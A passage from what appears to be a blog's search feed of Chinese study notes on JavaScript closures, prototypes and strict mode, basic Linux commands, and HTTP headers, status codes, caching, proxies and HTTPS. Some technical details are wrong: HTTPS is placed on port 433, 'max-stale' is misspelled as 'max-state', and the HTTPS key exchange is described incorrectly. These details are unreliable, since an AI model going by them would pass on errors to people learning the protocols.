那么a本身就会有a.substring这个方法，以及a.length这个属性。<br><br></li></ul><h4 id="2-3-闭包"><a href="#2-3-闭包" class="headerlink" title="2.3 闭包"></a>2.3 闭包</h4><p>在这个例子中，<code>myFunc</code>是执行<code>makeFunc</code>时创建的<code>displayName</code>函数实例的引用，而<code>displayName</code>实例仍可访问其词法作用域中的变量，即可访问到<code>name</code>。由此，当<code>myFunc</code>被调用时，<code>name</code>仍可被访问，其值<code>Mozilla</code>被传递到<code>alert</code>中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function makeFunc() &#123;</span><br><span class="line">  var name = &apos;Mozilla&apos;;</span><br><span class="line">  function displayName() &#123;</span><br><span class="line">    alert(name)</span><br><span class="line">  &#125;</span><br><span class="line">  return displayName;</span><br><span class="line">&#125;</span><br><span class="line">var myFunc = makeFunc();</span><br><span class="line">myFunc();</span><br></pre></td></tr></table></figure></p><p>由于循坏在事件触发之前早已执行完毕，变量对象<code>item</code>（被三个闭包所共享）已经指向了<code>helpText</code>的最后一项。此时，可使用匿名闭包。也可以使用<code>let item = helpText[i]</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">function showHelp(help) &#123;</span><br><span class="line">  document.getElementById(&apos;help&apos;).innerHTML = help;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function setupHelp() &#123;</span><br><span class="line">  var helpText = [</span><br><span class="line">      &#123;&apos;id&apos;: &apos;email&apos;, &apos;help&apos;: &apos;Your e-mail address&apos;&#125;,</span><br><span class="line">      &#123;&apos;id&apos;: &apos;name&apos;, &apos;help&apos;: &apos;Your full name&apos;&#125;,</span><br><span class="line">      &#123;&apos;id&apos;: &apos;age&apos;, &apos;help&apos;: &apos;Your age (you must be over 16)&apos;&#125;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">  for (var i = 0; i &lt; helpText.length; i++) &#123;</span><br><span class="line">    (function() &#123;</span><br><span class="line">       var item = helpText[i];</span><br><span class="line">       document.getElementById(item.id).onfocus = function() &#123;</span><br><span class="line">         showHelp(item.help);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;)(); // 马上把当前循环项的item与事件回调相关联起来</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setupHelp();</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="3-高级"><a href="#3-高级" class="headerlink" title="3. 高级"></a>3. 高级</h3><h4 id="3-1-继承与原型链"><a href="#3-1-继承与原型链" class="headerlink" title="3.1 继承与原型链"></a>3.1 继承与原型链</h4><p>jS对象有一个指向一个原型对象的链。当试图访问一个对象的属性时，它不仅仅在该对象上搜寻，还会搜寻该对象的原型，以及该对象的原型的原型，依次层层向上搜索，直到找到一个名字匹配的属性或到达原型链的末尾。<em>几乎所有JS中的对象都是位于原型链顶端的Object的实例。</em></p><p>遍历对象的属性时，原型链上的每个可枚举属性都会被枚举出来。要检查对象是否具有自己定义的属性，而不是其原型链上的某个属性，则必须使用所有对象从<code>Object.prototype</code>继承的<code>hasOwnProperty</code>。<code>g.hasOwnProperty(&#39;vertices&#39;)</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var o = new Foo(); </span><br><span class="line"></span><br><span class="line">// 相当于</span><br><span class="line">var o = new Object();</span><br><span class="line">o.__proto__ = Foo.prototype;</span><br><span class="line">Foo.call(o);</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-2-严格模式"><a href="#3-2-严格模式" class="headerlink" title="3.2 严格模式"></a>3.2 严格模式</h4><p>开启严格模式  <code>&quot;use strict&quot;;</code></p><table><thead><tr><th></th><th style="text-align:center">严格模式下抛出异常</th></tr></thead><tbody><tr><td>1. 无法意外创建全局变量</td><td style="text-align:center"><code>mistypedVariable = 17;</code></td></tr><tr><td>2. 给引起静默失败的赋值操作抛出异常</td><td style="text-align:center"><code>var obj1 = {}; Object.defineProperty(obj1, &quot;x&quot;, { value: 42, writable: false }); obj1.x = 9</code></td></tr><tr><td>3. 试图删除不可删除的属性会抛出异常</td><td style="text-align:center"><code>delete Object.prototype</code></td></tr><tr><td>4. 属性名在同一对象内必须唯一</td><td style="text-align:center"><code>var o = { p: 1, p: 2}</code></td></tr><tr><td>5. 函数的参数名唯一</td><td style="text-align:center"><code>function sum(a, a, c){}</code></td></tr><tr><td>6. 禁止八进制数学语法</td><td style="text-align:center"><code>var a = 0o10;</code></td></tr><tr><td>7. 禁止设置primitive值得属性</td><td style="text-align:center"><code>false.true = &quot;&quot;</code></td></tr><tr><td>8. 禁用with</td><td style="text-align:center"><code>with(obj){}</code></td></tr><tr><td>9. eval不再为上层范围引入新变量</td><td style="text-align:center"></td></tr><tr><td>10. 禁止删除声明变量</td><td style="text-align:center"><code>var x; delete x;</code></td></tr></tbody></table><ol start="11"><li>eval和arguments不能通过程序语法被绑定或赋值</li><li>参数的值不会随arguments对象的值得改变而改变   | <code>var a = 17; function f(a){ a = 42 ; console.log(arguments[0] // 17)}</code></li><li>不再支持arguments.callee        | 正常模式下,arguments.callee指向当前正在执行的函数<br><br></li></ol><h4 id="3-3-内存管理"><a href="#3-3-内存管理" class="headerlink" title="3.3 内存管理"></a>3.3 内存管理</h4><p>内存生命周期： 分配你所需要的内存、使用分配到的内存、不需要时将其释放</p>]]></content>
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Linux基本命令</title>
      <link href="/2019/09/01/Linux%E5%91%BD%E4%BB%A4/"/>
      <url>/2019/09/01/Linux%E5%91%BD%E4%BB%A4/</url>
      <content type="html"><![CDATA[<h3 id="1-基本命令"><a href="#1-基本命令" class="headerlink" title="1. 基本命令"></a>1. 基本命令</h3><ul><li>脚本执行<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chomd 755 hello.sh</span><br><span class="line">./hello.sh</span><br><span class="line">bash hello.sh</span><br><span class="line">  ```</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 别名与快捷键</span><br><span class="line">```shell</span><br><span class="line">alias  # 别名与快捷键</span><br></pre></td></tr></table></figure>]]></content>
      
      
    </entry>
    
    <entry>
      <title>HTTP</title>
      <link href="/2019/08/16/HTTP/"/>
      <url>/2019/08/16/HTTP/</url>
      <content type="html"><![CDATA[<h3 id="1-TCP-IP协议"><a href="#1-TCP-IP协议" class="headerlink" title="1. TCP/IP协议"></a>1. TCP/IP协议</h3><p>计算机与网络设备要相互通信，双方就必须基于相同的方法。如何探测到通信目标，由哪一边先发起通信、使用哪种语言进行通信，怎样结束通信等规则都需要事先确定。我们把这种规则成为协议 (protocol)。与互联网相关联的协议集合起来总称为 TCP/IP。</p><ul><li><p><em>TCP/IP 各层的作用</em><br>应用层：决定了向用户提供应用服务时通信的活动。如 FTP (file transfer protocol， 文本传输协议)，DNS (domain name system 域名系统)， HTTP<br>传输层：TCP 和 UDP<br>网络层：用来处理在网络上流动的数据包。该层规定了通过怎样的路径（传输路线）到达对方计算机，并将数据包传送给对方。<br>链路层：连接网络的硬件部分。</p></li><li><p><em>IP协议</em><br>负责传输。IP协议确保数据包传给了对方。IP地址指明了节点被分配到的地址；传输过程中，使用ARP协议获取MAC地址进行中转。</p></li><li><p><em>TCP</em><br>确保可靠性。TCP协议对大块数据分割成以报文段为单位的数据包进行管理，并确认数据最终送达到对方。TCP采用<strong>三次握手策略</strong>。发送端首先发送一个带SYN标志的数据包给对方。接收端收到后，回传一个带有SYN？ACK标志的数据包以示传达确认。最后，发送端再回传一个带ACK标志的数据包，代表“握手”结束。</p></li><li><p><em>DNS</em><br>DNS提供域名到IP地址之间的解析服务。</p></li></ul><ul><li><em>URL</em><br>URL(Uniform Resource Locator, 统一资源定位符)，是web浏览器访问页面时需要输入的地址。</li></ul><ul><li><em>URI</em><br>URI(Uniform Resource Identifier, 统一资源标识符)，是由某个协议方案(http, ftp, mailto, telnet, file等)表示的资源的定位标识符。<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// URI组成依次为协议方案名，登录信息，服务器地址，服务器端口，带层次的文件路径，查询字符串，片段标识符</span></span><br><span class="line">http:<span class="comment">//user:pass@www.example.jp:80/dir/index.html?uid=1#ch1</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="2-HTTP报文"><a href="#2-HTTP报文" class="headerlink" title="2. HTTP报文"></a>2. HTTP报文</h3><p>请求从客户端发出，最后服务器端响应该请求并返回。HTTP是一种不保存状态，即无状态协议。<br>用于 HTTP 协议交互的信息被称为 HTTP 报文。HTTP 报文本身是由多行数据构成的字符串文本。</p><p><br></p><h4 id="2-1-请求首部字段"><a href="#2-1-请求首部字段" class="headerlink" title="2.1 请求首部字段"></a>2.1 请求首部字段</h4><ul><li><p><em>Connection</em><br>HTTP的初始版本中，每进行一次HTTP通信就要断开一次TCP连接。每次请求都会造成无谓的TCP连接建立和断开，增加通信量的开销。为了解决这个问题，HTTP/1.0想到了持久连接Keep-alive。只要任意一端没有明确提出断开连接，则保持TCP连接状态。在HTTP/1.1中，所有的连接默认都是持久连接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># HTTP/1.1前的默认连接都是非持久链接，如果想维持持续链接，需要指定Keep-Alive</span><br><span class="line">Connection: Keep-Alive </span><br><span class="line"></span><br><span class="line"># 服务器想明确断开连接时，则指定为close</span><br><span class="line">Connection: Close</span><br></pre></td></tr></table></figure></li><li><p><em>Cache-Control</em><br>操作缓存的工作机制</p></li></ul><table><thead><tr><th>缓存请求指令</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>no-cache</td><td style="text-align:center">客户端将不会接收缓存过的响应</td></tr><tr><td>no-store</td><td style="text-align:center">不能在本地存储请求或响应的任一部分</td></tr><tr><td>max-age</td><td style="text-align:center">缓存资源的缓存时间比max-age小，就接受缓存的资源</td></tr><tr><td>min-fresh</td><td style="text-align:center">期望在指定时间内的响应仍有效</td></tr><tr><td>max-state</td><td style="text-align:center">即使过期，只要仍处于max-state指定时间内，仍会被客户端接收</td></tr><tr><td>only-if-cached</td><td style="text-align:center">要求缓存服务器不重新加载响应，也不再次确认资源有效性。若缓存服务器无反应，则返回504 Gateway Timeout</td></tr><tr><td>no-transform</td><td style="text-align:center">缓存不能改变实体主题的媒体类型，防止缓存或代理压缩图片等操作</td></tr></tbody></table><table><thead><tr><th>缓存响应指令</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>public</td><td style="text-align:center">表明其他用户也可以利用缓存</td></tr><tr><td>private</td><td style="text-align:center">只对特定用户提供资源缓存的服务</td></tr><tr><td>no-cache</td><td style="text-align:center">原服务器不对缓存服务器请求中提出的资源有效性进行确认，且禁止其对相应资源进行缓存操作</td></tr><tr><td>no-store</td><td style="text-align:center">不能在本地存储请求或响应的任一部分</td></tr><tr><td>s-maxage</td><td style="text-align:center">资源保存为缓存的最长时间</td></tr><tr><td>must-revalidate</td><td style="text-align:center">代理会向源服务器再次验证即将返回的响应缓存目前是否有效</td></tr><tr><td>proxy-revalidate</td><td style="text-align:center">缓存服务器在接收到客户端带有该指令的请求返回响应之前，必须再次验证缓存的有效性</td></tr><tr><td>no-transform</td><td style="text-align:center">缓存不能改变实体主题的媒体类型，防止缓存或代理压缩图片等操作</td></tr></tbody></table><ul><li><p><em>Content-Type</em><br>请求允许发送多种数据，采用了 MIME (Multipurpose Internet Mail Extensions, 多用途因特网邮件扩展) 机制，它允许邮件处理文本、图片、视频等多个不同类型的数据。例如，图片等二进制数据以 ASCII 码字符串编码的方式指明。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart/form-data;</span><br><span class="line">Content-Type: mulitpart/byteranges;</span><br></pre></td></tr></table></figure></li><li><p><em>Content-Range</em><br>范围请求，允许你实现从之前下载中断处恢复下载</p></li><li><p><em>Accept</em><br>通知服务器，用户代理能够处理的媒体类型及媒体类型</p></li></ul><p><br></p><h4 id="2-2-响应首部字段"><a href="#2-2-响应首部字段" class="headerlink" title="2.2 响应首部字段"></a>2.2 响应首部字段</h4><ul><li><em>Set-Cookie</em><br>服务端发送的响应报文内的一个叫做 Set-cookie 的首部字段信息，通知客户端保存 Cookie。当下次客户端再往该服务器发送请求时，客户端会自动在请求报文中加入 Cookie 值后发送出去。</li></ul><p><br></p><h4 id="2-3-其他"><a href="#2-3-其他" class="headerlink" title="2.3 其他"></a>2.3 其他</h4><ul><li>Date<br>表明创建 HTTP 报文的日期和时间</li><li>Transfer-Encoding<br>规定传输报文主体时采用的编码方式</li><li>Upgrade<br>检测是否可以使用更高的协议版本进行通信</li><li>Via<br>追踪客户端与服务器之间的请求和响应报文的传输路径</li><li>Authorization<br>用户代理的认证信息</li><li>Host<br>表示请求的资源所处的互联网主机名和端口号</li><li>If-Match:”123456”<br>告知服务器匹配资源所用的实体标记 (ETag 值)</li><li>If-Modified-Since:<br>在日期时间之后，如果请求的资源没有更新过，则返回状态码 304 Not Modified</li><li>Referrer<br>请求的 URI 是从哪个 web 页面发起的</li><li>User-Agent<br>创建请求的浏览器和用户代理名称</li></ul><p><br></p><h3 id="3-请求方法"><a href="#3-请求方法" class="headerlink" title="3. 请求方法"></a>3. 请求方法</h3><table><thead><tr><th>HTTP方法</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>GET</td><td style="text-align:center">GET请求会显示请求指定的资源。一般来说GET方法应该只用于数据的读取，而不应当用于会产生副作用的非幂等的操作中。它期望的应该是而且应该是安全的和幂等的。这里的安全指的是，请求不会影响到资源的状态。</td></tr><tr><td>POST</td><td style="text-align:center">传输实体主题</td></tr><tr><td>PUT</td><td style="text-align:center">传输文件</td></tr><tr><td>HEAD</td><td style="text-align:center">获得报文首部，用于确认URIDE有效性及资源更新的日期时间</td></tr><tr><td>DELETE</td><td style="text-align:center">删除文件</td></tr><tr><td>OPTIONS</td><td style="text-align:center">询问支持的方法</td></tr><tr><td>TRACE</td><td style="text-align:center">请求连接到源目标会通过代理中转，trace方法用来确认连接过程中发生的一系列操作</td></tr><tr><td>CONNECT</td><td style="text-align:center">要求用隧道协议连接代理</td></tr></tbody></table><p><br></p><h3 id="4-状态码"><a href="#4-状态码" class="headerlink" title="4. 状态码"></a>4. 状态码</h3><table><thead><tr><th>状态码</th><th style="text-align:right">描述</th></tr></thead><tbody><tr><td><code>100 Continue</code></td><td style="text-align:right">临时响应,表明客户端应该继续请求</td></tr><tr><td><code>101 Switching Protocol</code></td><td style="text-align:right">服务器正在切换协议</td></tr><tr><td><code>102 Processing (WebDAV)</code></td><td style="text-align:right">服务器已收到并正在处理，但没有响应可用。</td></tr><tr><td>2XX 表示成功处理了请求的状态代码。</td><td style="text-align:right"></td></tr><tr><td><code>200 OK</code></td><td style="text-align:right">服务器已成功处理了请求。 </td></tr><tr><td><code>201 Created</code></td><td style="text-align:right">请求成功并且服务器创建了新的资源,通常是PUT请求后的响应。 </td></tr><tr><td><code>202 Accepted</code></td><td style="text-align:right">服务器已接受请求，但尚未处理。 </td></tr><tr><td><code>203 Non-Authoritative Information</code></td><td style="text-align:right">服务器已成功处理了请求，但返回的信息可能来自另一来源。 </td></tr><tr><td><code>204 No Content</code></td><td style="text-align:right">服务器成功处理了请求，但没有返回任何内容。 </td></tr><tr><td><code>205 Reset Content</code></td><td style="text-align:right">服务器成功处理了请求，但没有返回任何内容。</td></tr><tr><td><code>206 Partial Content</code></td><td style="text-align:right">服务器成功处理了部分 GET 请求。</td></tr><tr><td>3开头，请求被重定向，表示要完成请求，需要进一步操作。</td><td style="text-align:right"></td></tr><tr><td><code>300 Multiple Choice</code></td><td style="text-align:right">服务器可根据请求者 (user agent) 选择一项操作，或提供操作列表供请求者选择。 </td></tr><tr><td><code>301 Moved Permanently</code></td><td style="text-align:right">请求的网页已永久移动到新位置。服务器返回此响应时，会自动将请求者转到新位置。</td></tr><tr><td><code>302 Found</code></td><td style="text-align:right">服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。</td></tr><tr><td><code>303 See Other</code></td><td style="text-align:right">请求者应当对不同的位置使用单独的 GET 请求来检索响应时，服务器返回此代码。</td></tr><tr><td><code>304 Not Modified</code></td><td style="text-align:right">上次请求后，请求的网页未修改过。服务器返回此响应时，不会返回网页内容。</td></tr><tr><td><code>307 Temporary Redirect</code></td><td style="text-align:right">服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。</td></tr><tr><td>4开头 （请求错误）这些状态代码表示请求可能出错，妨碍了服务器的处理。</td><td style="text-align:right"></td></tr><tr><td><code>400 Bad Request</code></td><td style="text-align:right">服务器不理解请求的语法。 </td></tr><tr><td><code>401 Unauthorized</code></td><td style="text-align:right">请求要求身份验证</td></tr><tr><td><code>403 Forbidden</code></td><td style="text-align:right">服务器拒绝请求。</td></tr><tr><td><code>404 Not Found</code></td><td style="text-align:right">服务器找不到请求的网页。</td></tr><tr><td><code>405 Method Not Allowed</code></td><td style="text-align:right">禁用请求中指定的方法。 </td></tr><tr><td><code>406 Not Acceptable</code></td><td style="text-align:right">无法使用请求的内容特性响应请求的网页。 </td></tr><tr><td><code>407 Proxy Authentication Required</code></td><td style="text-align:right">此状态代码与 401（未授权）类似，但指定请求者应当授权使用代理。</td></tr><tr><td><code>408 Request Timeout</code></td><td style="text-align:right">服务器等候请求时发生超时。 </td></tr><tr><td><code>409 Conflict</code></td><td style="text-align:right">由于和被请求的资源的当前状态之间存在冲突，请求无法完成。 </td></tr><tr><td><code>410 Gone</code></td><td style="text-align:right">被请求的资源在服务器上已经不再可用，而且没有任何已知的转发地址。</td></tr><tr><td><code>411 Length Required</code></td><td style="text-align:right">服务器拒绝在没有定义 Content-Length 头的情况下接受请求。</td></tr><tr><td><code>412 Precondition Failed</code></td><td style="text-align:right">服务器在验证在请求的头字段中给出先决条件时，没能满足其中的一个或多个。</td></tr><tr><td><code>413 Payload Too Large</code></td><td style="text-align:right">服务器拒绝处理当前请求，因为该请求提交的实体数据大小超过了服务器愿意或者能够处理的范围。</td></tr><tr><td><code>414 URI Too Long</code></td><td style="text-align:right">请求的 URI（通常为网址）过长，服务器无法处理。 </td></tr><tr><td><code>415 Unsupported Media Type</code></td><td style="text-align:right">请求中提交的实体并不是服务器中所支持的格式，请求被拒绝 </td></tr><tr><td><code>416 Requested Range Not Satisfiable</code></td><td style="text-align:right">请求中包含了 Range 请求头，并且 Range 中指定的任何数据范围都与当前资源的可用范围不重合，同时请求中又没有定义 If-Range 请求头</td></tr><tr><td><code>417 Expectation Failed</code></td><td style="text-align:right">服务器未满足”期望”请求标头字段的要求。</td></tr><tr><td>5开头（服务器错误）这些状态代码表示服务器在尝试处理请求时发生内部错误。 这些错误可能是服务器本身的错误，而不是请求出错。</td><td style="text-align:right"></td></tr><tr><td><code>500 Internal Server Error</code></td><td style="text-align:right">服务器遇到了不知道如何处理的情况。</td></tr><tr><td><code>501 Not Implemented</code></td><td style="text-align:right">此请求方法不被服务器支持且无法被处理。</td></tr><tr><td><code>502 Bad Gateway</code></td><td style="text-align:right">此错误响应表明服务器作为网关需要得到一个处理这个请求的响应，但是得到一个错误的响应。</td></tr><tr><td><code>503 Service Unavailable</code></td><td style="text-align:right">服务器没有准备好处理请求。 常见原因是服务器因维护或重载而停机。</td></tr><tr><td><code>504 Gateway Timeout</code></td><td style="text-align:right">当服务器作为网关，不能及时得到响应时返回此错误代码。</td></tr><tr><td><code>505 HTTP Version Not Supported</code></td><td style="text-align:right">服务器不支持请求中所用的 HTTP 协议版本。</td></tr></tbody></table><p><br></p><h3 id="5-Web服务器"><a href="#5-Web服务器" class="headerlink" title="5. Web服务器"></a>5. Web服务器</h3><p>HTTP/1.1允许一台HTTP服务器搭建多个Web站点。即使物理层面只有一台服务器，但只要使用虚拟主机的功能，则可以假象已具有多台服务器。域名通过DNS服务映射到IP地址，当请求发送到服务器时，已经是以IP形式访问了。</p><p>由于虚拟主机可以寄存多个不同域名的web网站，因此在发送http请求时，必须在Host首部完整指定域名的URI。</p><p><br></p><h4 id="5-1-代理、网关、隧道"><a href="#5-1-代理、网关、隧道" class="headerlink" title="5.1 代理、网关、隧道"></a>5.1 代理、网关、隧道</h4><p>HTTP通信时，除了客户端和服务器意外，还有一些用于通信数据转发的应用程序。它们将请求转发给通信线路上的下一站服务器，或者将服务器发送的响应转发给客户端。</p><p><em>代理</em><br><strong>作用</strong>：利用缓存技术减少网络带宽的流量，组织内部针对特定网站的访问控制，以获取访问日志为主要目的。<br><strong>缓存代理</strong>：代理转发响应时，缓存代理会预先将资源的副本保存在代理服务器上。当代理再次接收到相同资源请求时，可以不从服务器那里获取，而是将之前缓存的资源作为响应返回。<br><strong>透明代理</strong>：转发请求或响应时，不对报文做任何加工的代理。</p><p><em>网关</em><br>网关能使通信线路上的服务器提供非HTTP协议服务。利用网关可以提高通信的安全性，在通信线路上加密；网关可以连接数据库，使用sql语句查询数据。</p><p><em>隧道</em><br>隧道可按要求建立起一条与其他服务器的通信线路，使用SSL等加密手段进行通信。确保客户端能与服务器进行安全的通信。</p><p><br></p><h4 id="5-2-缓存"><a href="#5-2-缓存" class="headerlink" title="5.2 缓存"></a>5.2 缓存</h4><p>缓存是指代理服务器或客户端本地磁盘内保存的资源副本。</p><p><em>客户端的缓存</em><br>存在于客户端浏览器中的文件，成为临时网络文件（Temporary Internet File）。浏览器缓存如果有效，可以直接从本地磁盘内读取。</p><p><em>缓存的有效期限</em><br>即使存在缓存，也会因为客户端的要求、缓存的有效期等因素，向源服务器确认资源的有效性。若判断缓存失效，缓存服务器将再次从源服务器上获取新资源。</p><p>缓存可以简单分为两种类型：强缓存(200 from cache) 与协商缓存(304)。对于协商缓存，使用ctrl + F5强制刷新可以使得缓存无效。但是对于强缓存，在未过期时，必须更新资源路径才能发起新的请求（更改路径相当于是另一个资源）。</p><p><strong>强缓存(200 from cache)</strong><br>浏览器如果判断本地缓存未过期，就直接使用，无需发起http请求<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 属于强缓存</span><br><span class="line">(http1.1)Cache-Control/Max-Age</span><br><span class="line">(http1.0)Pragma/Expires</span><br></pre></td></tr></table></figure></p><p><strong>协商缓存(304)</strong><br>浏览器会向服务端发起http请求，然后服务端告诉浏览器文件未改变，让浏览器使用本地缓存<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 属于协商缓存</span><br><span class="line">(http1.1)If-None-Match/E-TAG</span><br><span class="line">(HTTP1.0)If-Modified-Since/Last-Modified</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="6-常见问题"><a href="#6-常见问题" class="headerlink" title="6. 常见问题"></a>6. 常见问题</h3><p><em>1. cdn的原理</em><br>当我们在地址栏输入一个网址，浏览器发现本地没有关于这个网址的 DNS 缓存，所以向网站的 DNS 服务器发起请求。<br>网站的 DNS 服务器设置了 CNAME，指向了某个 CDN 服务器，也就是我们常见的阿里云、腾讯云。<br>如果是第一次访问该内容，CDN 服务器会向源站请求数据并缓存。<br>否则，CDN服务器会找到 缓存了这个资源，并对用户响应最快的节点返回给用户，然后用户向该节点发出请求。</p><p><br><br><em>2. shadowsock的原理</em><br>在很久很久以前，我们访问各种网站都是简单而直接的，用户的请求通过互联网发送到服务提供方，服务提供方直接将信息反馈给用户。</p><p>然后有一天，GFW 就出现了，他像一面墙，每当用户需要获取信息，都经过了 GFW，GFW将它不喜欢的内容统统过滤掉，于是客户当触发 GFW 的过滤规则的时候，就会收到 Connection Reset 这样的响应内容，而无法接收到正常的内容。</p><p>聪明的人们想到了利用境外服务器代理的方法来绕过 GFW 的过滤，其中包含了各种HTTP代理服务、Socks服务、×××服务… 其中以 ssh tunnel 的方法比较有代表性</p><ul><li>首先用户和境外服务器基于 ssh 建立起一条加密的通道</li><li>用户通过建立起的隧道进行代理，通过 ssh server 向真实的服务发起请求</li><li>服务通过 ssh server，再通过创建好的隧道返回给用户</li></ul><p><br><br><em>3. https的原理</em><br>HTTP协议，本身是明文传输的，因此很容易在传输过程中被中间这窃听、篡改、冒充。（Wifi热点，路由器，防火墙，反向代理，缓存服务器）。为了解决这些风险，HTTPS的价值就体现出来了</p><ul><li>内容加密，第三方无法窃听。</li><li>身份认证，一旦被篡改，通信双方会立刻发现。</li><li>数据完整性。防止内容冒充或者篡改。</li></ul><p><br><br>HTTPS，即HTTP下加入SSL层。HTTP + SSL/TLS。HTTPS的整个交互过程如下：</p><ul><li>用户在浏览器里输入一个https网址，此时客户端发起https请求，通过tcp和服务器建立连接(433端口)。</li><li>服务器存放CA证书进行处理，注意用HTTPS的服务器必须要有一套数字证书，这套证书其实一对公钥和私钥。</li><li>服务器向客户端返回证书。证书包含：域名，申请证书的公司，公钥。</li><li>客户端对证书进行解析。这个工作由客户端的TLS完成，首先会验证公钥是否有效，如颁发机构，过期时间等。如果发现异常，就会弹出一个警告框，提示证书存在问题。如果证书没有问题，就会生成一个随机数，然后用证书对该随机数进行加密。</li><li>向服务器发送证书加密后的随机数</li><li>服务器用它的私密进行解密，得到客户端传来的随机数</li><li>服务器用客户端的随机数加密后的信息发送给客户端</li><li>客户端用之前生成的私钥解密服务端传过来的信息</li></ul><p><br><br><em>4. 可以自定义HTTP请求方法吗？</em><br>不能。<br>HTTP1.0定义了三种请求方法： GET、POST、HEAD<br>HTTP1.1新增了五种请求方法：OPTIONS、PUT、DELETE、TRACE 、CONNECT</p><p><br><br><em>5. 为什么同一网站的资源要使用不同域名加载(oss,cdn)</em><br>浏览器对同一有连接数的限制。</p><p><br><br><em>7. TCP, UDP, IP, HTTP的区别</em><br>TCP, UDP是传输层协议，IP是网络层协议，HTTP是应用层协议。</p><ul><li>IP<br>是用来找到目标计算机。如A向B发送数据，那么要找到对方B的计算机，找到后就确定了网络间的通道，A - B。也就是说IP是来确定网络间的路径的。</li><li>TCP<br>是用来实现通信的，在IP实现了网络间路径后，TCP提供了这个路径的全双工通信的能力。这个链接的建立要经历三次握手，断开链接要四次挥手。（全双工：A可以给B发送数据的同时，B也可以给A发送数据）</li><li>UDP<br>是和TCP相似的，也是提供了通信能力。不过和TCP有区别。TCP是点对点的通讯，UDP支持一对多，多对一，一对一等。UDP不需要链接，直接发数据，相对来说速度更快，但是不保证数据一定会到达，适合广播。</li><li>HTTP<br>http是应用层的协议，它实现了怎么发数据和怎么收数据，定义了收发的格式</li></ul><p><br><br><em>8. http1.0，HTTP2.0的区别？</em></p><p><strong>延迟</strong><br>影响一个HTTP网络请求的因素主要有两个：带宽和延迟。</p><ul><li>浏览器阻塞<br>浏览器对于同一个域名有连接数限制。超过浏览器最大连接数限制，后续请求就会被阻塞。</li><li>DNS查询<br>浏览器需要知道目标服务器的 IP 才能建立连接。利用DNS缓存可以减少这个时间</li><li>建立连接<br>HTTP 是基于 TCP 协议的，浏览器最快也要在第三次握手时才能捎带 HTTP 请求报文，达到真正的建立连接，但是这些连接无法复用会导致每次请求都经历三次握手和慢启动。三次握手在高延迟的场景下影响较明显，慢启动则对文件类大请求影响较大。</li></ul><p><br><br><strong> HTTP1.0和HTTP1.1的区别</strong></p><ul><li>缓存处理<br>HTTP1.0中使用If-Modified-Since,Expires来做缓存判断的标准。HTTP1.1则引入了更多缓存控制策略，如Entity tag，If-Unmodified-Since, If-Match, If-None-Match。</li><li>Range<br>允许只请求资源的某个部分，支持断点续传功能</li><li>Host<br>在HTTP1.0中认为每台服务器都绑定一个唯一的IP地址。但随着虚拟主机技术的发展，在一台物理服务器上可以存在多个虚拟主机（Multi-homed Web Servers），并且它们共享一个IP地址。HTTP1.1的请求消息和响应消息都应支持Host头域。</li><li>长连接<br>HTTP 1.1支持长连接（PersistentConnection）和请求的流水线（Pipelining）处理，在一个TCP连接上可以传送多个HTTP请求和响应，减少了建立和关闭连接的消耗和延迟，在HTTP1.1中默认开启Connection： 